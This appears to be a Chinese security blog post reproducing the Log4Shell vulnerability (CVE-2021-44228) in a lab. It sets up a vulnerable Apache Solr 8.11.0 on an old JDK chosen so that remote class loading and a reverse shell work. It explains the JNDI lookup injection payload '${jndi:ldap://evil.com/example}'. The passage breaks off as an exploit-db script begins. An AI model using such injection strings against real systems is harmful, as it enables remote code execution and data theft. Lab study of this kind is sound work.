<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"ttoc.xin","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"1NWCFV229B","apiKey":"89f81f113af1e49e4b5061eb680ea44d","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="想把一些常见的CVE以及一些经典漏洞复现，做做笔记">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE漏洞学习">
<meta property="og:url" content="https://ttoc.xin/CVE-Test/index.html">
<meta property="og:site_name" content="Ttoc&#39;s blog">
<meta property="og:description" content="想把一些常见的CVE以及一些经典漏洞复现，做做笔记">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221201005804892.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221201010242171.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221221161421513.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221221161638879.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221201111930502.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221201112302036.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221201112554067-1671632324475-1.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221201112725299.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221201112839632.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221201113319037.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221220220624019.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221201115827107.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221204224323306-1671800988704-1.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221220145121926.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221220145505204.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221220145131607.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221220145054026.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221220220840849.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221220175405653.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221220170944260.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221221163132059.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221221203418508.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221221203458628.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20221221203538282.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230226154457424.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230226152124965.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230226141556869.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230226142921961.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230226165115723.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230302000014731.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230302000455096.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230302000412160.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230302001529947.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230302210930469.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20230226141556869.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/2.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/1.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/4.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/5.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/6.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/7.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/8.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130123224439.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130123350919.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130123511391.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/dnslog%E6%B5%8B%E8%AF%95.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/dnslog.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130225927419.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130231729924.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130224424739.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130223814313.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130231601753.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130233109406.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130233218761.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130233600459.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130235701569.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231130235335497.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201110707134.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201000810938.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201001110687.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201111621945.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201112427314.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201112511153.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201113317976.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201115947536.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201120655450.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201120113628.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201120153540.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201120819297.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201121316063.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201121529910.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201121609229.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201121742343.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201121843879.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201124945937.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201125234934.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201125315971.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201125405018.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201122459733.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201124049869.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201124410575.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201123307378.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201123614967.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201122754841.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201125647334.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201125831451.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201213653846.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201213957613.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201214138728.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231201214155986.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231204203947464.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231204203928772.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/image-20231204203913643.png">
<meta property="og:image" content="https://ttoc.xin/CVE-Test/a.png">
<meta property="article:published_time" content="2022-12-01T04:07:19.084Z">
<meta property="article:modified_time" content="2024-12-11T05:43:01.677Z">
<meta property="article:author" content="Ttoc">
<meta property="article:tag" content="漏洞">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttoc.xin/CVE-Test/image-20221201005804892.png">

<link rel="canonical" href="https://ttoc.xin/CVE-Test/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CVE漏洞学习 | Ttoc's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style><link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ttoc's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">必须从过去的错误学习教训，而非依赖过去的成功。</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://ttoc.xin/CVE-Test/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ttoc">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ttoc's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE漏洞学习
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-12-01 12:07:19" itemprop="dateCreated datePublished" datetime="2022-12-01T12:07:19+08:00">2022-12-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-12-11 13:43:01" itemprop="dateModified" datetime="2024-12-11T13:43:01+08:00">2024-12-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">网络安全学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p><strong><code>想把一些常见的CVE以及一些经典漏洞复现，做做笔记</code></strong></p>
<span id="more"></span>

<h1 id="CVE-2021-44228-Log4j2"><a href="#CVE-2021-44228-Log4j2" class="headerlink" title="CVE-2021-44228 Log4j2"></a>CVE-2021-44228 Log4j2</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>Apache Log4j2 是一个被广泛使用的开源日志记录库，2017 年 7 月时，有人向 Log4j2 提了支持 JNDI Lookup 的需求，并从 2.0-beta9 之后开始支持；今年阿里的安全研究人员发现该特性会导致远程代码执行，于 2021 年 11 月 24 日向 Apache 报告了该漏洞；12 月 5 日官方发布了补丁；到了 12 月 9 日晚，PoC 的传播范围开始变得不可控，基本上各大厂商都受影响，影响范围很广，于是人们给它起了个名字——Log4Shell。</p>
</blockquote>
<blockquote>
<p>环境搭建虚拟机版本: ubuntu 20.4<br>Apache solr版本: 8.11.0</p>
</blockquote>
<h3 id="Apache-solr-8-11-0下载"><a href="#Apache-solr-8-11-0下载" class="headerlink" title="Apache solr 8.11.0下载"></a>Apache solr 8.11.0下载</h3><p>这里我采用的是<code>Apache Solr</code>开源服务器</p>
<blockquote>
<p>Solr是Apache下的一个顶级开源项目，采用Java开发，它是基于Lucene的全文搜索服务器。Solr提供了比Lucene更为丰富的查询语言，同时实现了可配置、可扩展，并对索引、搜索性能进行了优化。</p>
</blockquote>
<p>针对漏洞修复时间<code>[12 月 5 日]</code>，和官方更新文档</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201005804892.png"><img src="/CVE-Test/image-20221201005804892.png" alt="image-20221201005804892"></a></p>
<p><code>Apache Solr 8.11.0</code>是<code>CVE-2021-44228</code>修复前的最后的一个版本</p>
<p>所以该版本也存在<code>CVE-2021-44228</code></p>
<p>于是下载</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https</span>://archive.apache.org/dist/lucene/solr/<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201010242171.png"><img src="/CVE-Test/image-20221201010242171.png" alt="image-20221201010242171"></a></p>
<h3 id="JAVA配置"><a href="#JAVA配置" class="headerlink" title="JAVA配置"></a>JAVA配置</h3><p>由于<code>Apache solr</code>是基于<code>Java</code>开发的项目，所以需要先下载对应版本的<code>Java</code></p>
<p><strong>但是针对log4j2存在的版本，需要jdk1.8.0才可以复现</strong></p>
<p>但是</p>
<blockquote>
<p>高版本的JDK环境中<code>trustURLCodebase</code>变量为false，限制了远程类的加载，导致<code>JNDI</code>注入利用失败，无法反弹shell<br>能实现利用条件：版本≤ <code>JDK 6u211、7u201、 8u191、11.0.1</code>。<br>但是过低版本的，solr运行可能会出错</p>
</blockquote>
<p>所以这里从官网下载专门的<code>8u171</code></p>
<h4 id="解压到对应目录"><a href="#解压到对应目录" class="headerlink" title="解压到对应目录"></a>解压到对应目录</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf jdk-<span class="number">8</span>u171-linux-x64.tar.gz -C <span class="regexp">/usr/</span>local<span class="regexp">/jdk/</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221161421513.png"><img src="/CVE-Test/image-20221221161421513.png" alt="image-20221221161421513"></a></p>
<h4 id="部署并修改环境变量"><a href="#部署并修改环境变量" class="headerlink" title="部署并修改环境变量"></a>部署并修改环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo vi ~/.bashrc</span><br><span class="line">在文件末尾追加下面4行内容</span><br><span class="line"><span class="comment">## 这里要注意目录要换成自己解压的jdk 目录</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/local/jdk/jdk1.8.0_171 </span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre  </span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib  </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#使其上面环境变量设置生效</span></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line">sudo update-alternatives --install /usr/bin/java java /usr/local/jdk/jdk1.8.0_171/bin/java 300</span><br></pre></td></tr></table></figure>

<h4 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">version</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221221161638879.png"><img src="/CVE-Test/image-20221221161638879.png" alt="image-20221221161638879"></a></p>
<h3 id="Solr下载"><a href="#Solr下载" class="headerlink" title="Solr下载"></a><code>Solr</code>下载</h3><p>下载<code>solr 8.11.0</code></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> wget https://archive.apache.org/dist/lucene/solr/<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201111930502.png"><img src="/CVE-Test/image-20221201111930502.png" alt="image-20221201111930502"></a></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201112302036.png"><img src="/CVE-Test/image-20221201112302036.png" alt="image-20221201112302036"></a></p>
<p>然后就解压</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> tar xzf solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201112554067-1671632324475-1.png"><img src="/CVE-Test/image-20221201112554067-1671632324475-1.png" alt="image-20221201112554067"></a></p>
<h3 id="安装-Apache-Solr服务"><a href="#安装-Apache-Solr服务" class="headerlink" title="安装 Apache Solr服务"></a>安装 <code>Apache Solr</code>服务</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> bash solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>/bin/install_solr_service.sh solr-<span class="number">8</span>.<span class="number">11</span>.<span class="number">0</span>.tgz</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201112725299.png"><img src="/CVE-Test/image-20221201112725299.png" alt="image-20221201112725299"></a></p>
<p>查看服务状态</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo systemctl status solr</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201112839632.png"><img src="/CVE-Test/image-20221201112839632.png" alt="image-20221201112839632"></a></p>
<p>发现服务已经存在</p>
<p>启动</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo /lib/systemd/systemd-sysv-install <span class="built_in">enable</span> solr</span><br><span class="line"><span class="comment">#若执行sudo systemctl enable solr会提示不是本机服务，需要按上面方式启动运行</span></span><br></pre></td></tr></table></figure>

<p>因为<code>solr</code>默认运行的端口为<code>8983</code></p>
<p>查看环境搭建的虚拟机<code>ip</code></p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201113319037.png"><img src="/CVE-Test/image-20221201113319037.png" alt="image-20221201113319037"></a></p>
<p>得到环境搭建靶机<code>ip</code>为</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168.80.131</span></span><br></pre></td></tr></table></figure>

<h3 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h3><p>浏览器访问</p>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.80.131:8983</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221220220624019.png"><img src="/CVE-Test/image-20221220220624019.png" alt="image-20221220220624019"></a></p>
<p>搭建成功</p>
<p>内网环境中的攻击机也成功访问</p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221201115827107.png"><img src="/CVE-Test/image-20221201115827107.png" alt="image-20221201115827107"></a></p>
<p>环境搭建完毕</p>
<h2 id="了解漏洞描述与注入原理"><a href="#了解漏洞描述与注入原理" class="headerlink" title="了解漏洞描述与注入原理"></a><strong>了解漏洞描述与注入原理</strong></h2><p><code>Apache Log4j 2</code> 是<code>Java</code>语言的日志处理套件，使用极为广泛。在其<code>2.0</code>到<code>2.14.1</code>版本中存在一处<code>JNDI</code>注入漏</p>
<p>洞，攻击者在可以控制日志内容的情况下，通过传入类似于</p>
<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>的<code>lookup</code>用于进行<code>JNDI</code>注入，执行任意代码。</p>
<h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p><code>Log4j2</code> <code>Lookup</code>是<code>Log4j2</code>的一项功能，允许您<strong>在日志消息中使用动态值</strong>，<code>Log4j2</code>提供了许多内置的<code>Lookup</code>对</p>
<p>象，用于查找不同类型的值</p>
<p>例如<code>SystemPropertiesLookup.lookup(&quot;user.home&quot;)</code>方法返回了系统属性<code>user.home</code>的值，并将其插入日志</p>
<p>消息中。</p>
<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>开始我也看不太懂<code>JNDI</code>任意代码执行语句意思</p>
<p>先了解一下<code>JNDI</code>是什么以及其组成</p>
<p><code>JNDI</code>（<code>Java</code>命名和目录接口），是<code>Java</code>提供的一个目录服务应用程序接口（<code>API</code>）</p>
<p>它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 </p>
<blockquote>
<p>其中大致有<br>远程方法调用（<code>RMI</code>），通用对象请求代理体系结构（<code>CORBA</code>），轻型目录访问协议（<code>LDAP</code>）或域名服务（<code>DNS</code>）</p>
</blockquote>
<p>其大致组成为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String jndiName= ...;<span class="comment">//指定需要查找name名称</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//初始化默认环境</span></span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSourse)context.lookup(jndiName);<span class="comment">//查找该name的数据</span></span><br></pre></td></tr></table></figure>

<p><u><strong>所以如果能控制<code>jndiName</code>，再利用<code>rmi</code>之类的加载远程恶意类，从而执行恶意类的命令，故而实现远程代码执行</strong></u></p>
<h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>结合<code>lookup</code>和<code>jndi</code></p>
<p><strong>对于<code>payload</code></strong></p>
<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>是<code>Log4j2</code>中使用的<strong>占位符</strong>语法。<strong>它表示在日志消息中插入一个使用</strong></p>
<p><strong><code>JNDILookup</code>对象查找的值</strong></p>
<p><code>ldap://evil.com/example</code>是<code>JNDI</code>查找所使用的名称。这意味着<code>Log4j2</code>将在<code>JNDI</code>上下文中查找名为<code>example</code></p>
<p>的对象，该对象位于<code>evil.com</code>服务器上，就可能实现访问一些敏感信息以及其他恶意操作的目的</p>
<h2 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h2><p>这里调用**<code>exploitdb</code>**中的对<code>Log4j2</code>利用的脚本，这是一个信息泄露的脚本</p>
<p>发布时间: <code>12/12/2021</code></p>
<p><code>【ps.这个脚本可能是作者上传到exp的时候空格问题，需要稍微修改一下就可以用了】</code></p>
<p><a data-fancybox="gallery" data-src="/CVE-Test/image-20221204224323306-1671800988704-1.png"><img src="/CVE-Test/image-20221204224323306-1671800988704-1.png" alt="image-20221204224323306"></a></p>
<p>脚本内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 